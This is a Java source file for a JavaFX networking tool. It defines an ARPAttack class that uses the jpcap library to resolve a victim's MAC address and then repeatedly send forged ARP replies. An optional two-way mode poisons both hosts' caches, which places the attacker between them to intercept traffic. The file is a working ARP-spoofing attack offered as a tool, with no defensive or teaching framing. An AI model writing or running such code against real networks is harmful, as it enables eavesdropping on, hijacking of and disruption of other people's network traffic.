package pers.harry_deng.yawnsuite.functions;

import javafx.scene.control.TableView;
import javafx.scene.control.TextField;
import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.Packet;
import pers.harry_deng.yawnsuite.beans.properties.HostTableData;

import java.io.IOException;
import java.net.InetAddress;
import java.util.Arrays;

import static pers.harry_deng.yawnsuite.utils.NetUtil.strToMac;

public class ARPAttack implements Runnable {
    private boolean threadStop = false;
    private boolean ifTwoWay = false;
    private String desIP;
    private String srcIP;
    private String srcMAC;
    private String attIP;
    private NetworkInterface device;

    public void setNetworkInterface(NetworkInterface networkInterface) {
        this.device = networkInterface;
    }

    public void setDesIP(String desIP) {
        this.desIP = desIP;
    }

    public void setSrcIP(String srcIP) {
        this.srcIP = srcIP;
    }

    public void setSrcMAC(String srcMAC) {
        this.srcMAC = srcMAC;
    }

    public void setAttIP(String attIP) {
        this.attIP = attIP;
    }

    public void setThreadStop(boolean threadStop) {
        this.threadStop = threadStop;
    }

    public void setIfTwoWay(boolean ifTwoWay) {
        this.ifTwoWay = ifTwoWay;
    }

    public byte[] getOtherMAC(String desIP, String attIP) throws IOException {
        JpcapCaptor jc = JpcapCaptor.openDevice(device, 2000, false, 3000);
        JpcapSender sender = jc.getJpcapSenderInstance();
        InetAddress senderIP = InetAddress.getByName(attIP);
        InetAddress targetIP = InetAddress.getByName(desIP);

        ARPPacket arp = new ARPPacket();
        arp.hardtype = ARPPacket.HARDTYPE_ETHER;
        arp.prototype = ARPPacket.PROTOTYPE_IP;
        arp.operation = ARPPacket.ARP_REQUEST;
        arp.hlen = 6;
        arp.plen = 4;

        arp.sender_hardaddr = device.mac_address;
        arp.sender_protoaddr = senderIP.getAddress();
        byte[] broadcast = new byte[]{(byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255};
        arp.target_hardaddr = broadcast;
        arp.target_protoaddr = targetIP.getAddress();

        EthernetPacket ether = new EthernetPacket();
        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
        ether.src_mac = device.mac_address;
        ether.dst_mac = broadcast;
        arp.datalink = ether;
        sender.sendPacket(arp);

        while (true) {
            Packet packet = jc.getPacket();
            if (packet instanceof ARPPacket) {
                ARPPacket p = (ARPPacket) packet;
                if (Arrays.equals(p.target_protoaddr, senderIP.getAddress())) {
                    System.out.println("get mac ok");
                    return p.sender_hardaddr; //返回
                }
            }
        }
    }

    @Override
    public void run() {
        while (true) {
            try {
                JpcapCaptor jpcap = JpcapCaptor.openDevice(device, 65535,
                        false, 3000);
                jpcap.setFilter("arp", true);
                JpcapSender sender = JpcapSender.openDevice(device);
                ARPPacket arp = new ARPPacket();
                ARPPacket arp2 = new ARPPacket();
                arp.hardtype = ARPPacket.HARDTYPE_ETHER;
                arp.prototype = ARPPacket.PROTOTYPE_IP;
                arp.operation = ARPPacket.ARP_REPLY;
                arp.hlen = 6;
                arp.plen = 4;

                byte[] srcmac = strToMac(srcMAC);
                arp.sender_hardaddr = srcmac;
                arp.sender_protoaddr = InetAddress.getByName(srcIP).getAddress();
                arp.target_hardaddr = getOtherMAC(desIP, attIP);
                arp.target_protoaddr = InetAddress.getByName(desIP).getAddress();

                EthernetPacket ether = new EthernetPacket();
                ether.frametype = EthernetPacket.ETHERTYPE_ARP;
                ether.src_mac = srcmac;
                ether.dst_mac = getOtherMAC(desIP, attIP);
                arp.datalink = ether;

                if (ifTwoWay) {
                    arp2.hardtype = ARPPacket.HARDTYPE_ETHER;
                    arp2.prototype = ARPPacket.PROTOTYPE_IP;
                    arp2.operation = ARPPacket.ARP_REPLY;
                    arp2.hlen = 6;
                    arp2.plen = 4;

                    arp2.sender_hardaddr = srcmac;
                    arp2.sender_protoaddr = InetAddress.getByName(desIP).getAddress();
                    arp2.target_hardaddr = getOtherMAC(srcIP, attIP);
                    arp2.target_protoaddr = InetAddress.getByName(srcIP).getAddress();

                    EthernetPacket ether2 = new EthernetPacket();
                    ether2.frametype = EthernetPacket.ETHERTYPE_ARP;
                    ether2.src_mac = srcmac;
                    ether2.dst_mac = getOtherMAC(srcIP, attIP);
                    arp2.datalink = ether2;

                }

                do {
                    System.out.println("-Attacking!");
                    sender.sendPacket(arp);
                    if (ifTwoWay) sender.sendPacket(arp2);
                    Thread.sleep(1000);
                } while (!threadStop);
            } catch (InterruptedException | IOException e) {
                e.printStackTrace();
            }
        }
    }

    public void getHostIP(TextField tf_desIP, TableView<HostTableData> tableView) {

        tableView.getSelectionModel().selectedItemProperty().addListener(
                (observable, oldValue, newValue) -> tf_desIP.setText(newValue.getHostIP())
        );
    }
}
